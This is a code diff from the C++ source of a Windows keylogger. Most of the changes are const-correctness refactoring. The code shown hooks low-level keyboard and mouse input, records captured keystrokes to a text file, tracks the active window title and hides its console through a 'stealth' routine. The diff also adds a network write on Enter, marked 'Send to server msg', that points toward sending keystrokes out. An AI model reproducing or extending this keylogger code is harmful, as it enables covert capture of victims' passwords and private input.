@@ -20,29 +20,29 @@ Keylog::~Keylog()
 {
 }
 
-int		Keylog::getKey()
+const int		&Keylog::getKey() const
 {
 	return (keyPressed);
 }
 
-COORD	Keylog::getMouse()
+const COORD	&Keylog::getMouse() const
 {
 	return (mousePos);
 }
 
-int		Keylog::getForeground()
+const int		Keylog::getForeground()
 {
 	fg = GetForegroundWindow();
 
 	return (0);
 }
 
-void	Keylog::setKey(int key)
+void	Keylog::setKey(const int &key)
 {
 	this->keyPressed = key;
 }
 
-void	Keylog::setMouse(int x, int y)
+void	Keylog::setMouse(const int &x, const int &y)
 {
 	COORD	pos;
 	pos.X = x;
@@ -50,7 +50,7 @@ void	Keylog::setMouse(int x, int y)
 	mousePos = pos;
 }
 
-int		Keylog::stealth()
+const int		Keylog::stealth()
 {
 	HWND Stealth;
 	AllocConsole();
@@ -59,7 +59,7 @@ int		Keylog::stealth()
 	return (0);
 }
 
-bool	Keylog::peekMsg(void)
+const bool	Keylog::peekMsg()
 {
 	return (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE) != 0);
 }
@@ -67,14 +67,12 @@ bool	Keylog::peekMsg(void)
 LRESULT CALLBACK Keylog::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	char	ch;
-//	FILE    *file_db;
 	std::ofstream file_db("database.txt", std::ofstream::out | std::ofstream::app);
 
 	if (nCode < 0)
 		return CallNextHookEx(NULL, nCode, wParam, lParam);
 
 	ch = 0;
-//	file_db = fopen("database.txt", "a+");
 
 	tagKBDLLHOOKSTRUCT *str = (tagKBDLLHOOKSTRUCT *)lParam;
 
@@ -101,13 +99,12 @@ LRESULT CALLBACK Keylog::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 			if (str->vkCode == VK_RETURN)
 			{
+				net.write("");
 				// Send to server msg
 			}
 			else if (str->vkCode == VK_SPACE || (ch >= 0 && ch <= 127))
 			{
-				std::cout << "Je write motherfucker" << std::endl;
 				file_db << ch << std::endl;
-	//			fwrite(&ch, 1, 1, file_db);
 			}
 		}
 	return CallNextHookEx(0, nCode, wParam, lParam);
@@ -157,7 +154,7 @@ LRESULT CALLBACK Keylog::LowLevelMouseProc(int code, WPARAM wParam, LPARAM lPara
 	return CallNextHookEx(0, code, wParam, lParam);
 }
 
-std::string	Keylog::GetActiveWindowTitle()
+const std::string	Keylog::GetActiveWindowTitle()
 {
 	char wnd_title[256];
 
